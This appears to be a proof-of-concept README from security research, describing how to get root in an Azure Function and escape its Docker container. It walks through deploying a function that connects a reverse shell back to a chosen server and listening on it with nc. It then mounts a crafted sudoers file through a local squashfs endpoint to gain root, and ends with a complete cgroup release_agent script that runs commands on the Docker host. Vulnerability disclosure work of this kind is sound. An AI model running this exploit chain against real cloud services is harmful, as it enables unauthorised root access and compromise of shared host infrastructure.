In this POC we'll setup a reverse shell with the squashfs to escalate privileges in Azure Function, and break out of the Docker environment.

1. Install [Azure Functions CLI](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local?tabs=linux%2Ccsharp%2Cbash)

2. Follow the Azure [guide](https://docs.microsoft.com/en-us/azure/azure-functions/create-first-function-cli-python?tabs=azure-cli%2Cbash%2Cbrowser) for setting up an Azure Function

3. Copy the files required for the POC to the function directory:

   ```bash
   cp files/__init__.py FUNCTIONDIR/FUNCTIONNAME/__init__.py
   cp files/sudoers.sqsh FUNCTIONDIR/
   ```

4. Fill in the `PORT` and `IP` fields in the `FUNCTIONDIR/FUNCTIONNAME/__init__.py`  file to the server that will communicate with the reverse shell.

5. Deploy the function (like in the guide above):

   ```func azure functionapp publish <APP_NAME>```

6. Listen on the reverse shell port (don't forget to white list this port on the firewall):

   ```nc -nlv 0.0.0.0 PORT ```

   and invoke the Function with the invocation URL you were given with the `functionapp publish` command.

7. You should now be in the Azure Function, escalate privileges:

   ```bash
   curl "localhost:6060/?operation=squashfs&filePath=/home/site/wwwroot/sudoers.sqsh&targetPath=/etc/sudoers.d"
   sudo su
   ```

8. Finally, break out of the Docker container (run ps on the Docker host in our example):

   ```bash
   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
            
   touch /output
   echo 1 > /tmp/cgrp/x/notify_on_release
   mount > /tmp/mtab
   host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /tmp/mtab`
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
            
   echo '#!/bin/sh' > /cmd
   echo "ps aux >> $host_path/hostps" >> /cmd
   echo "ps aux >> $host_path/hostps2" >> /cmd
   chmod a+x /cmd
   
   sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 
   ```

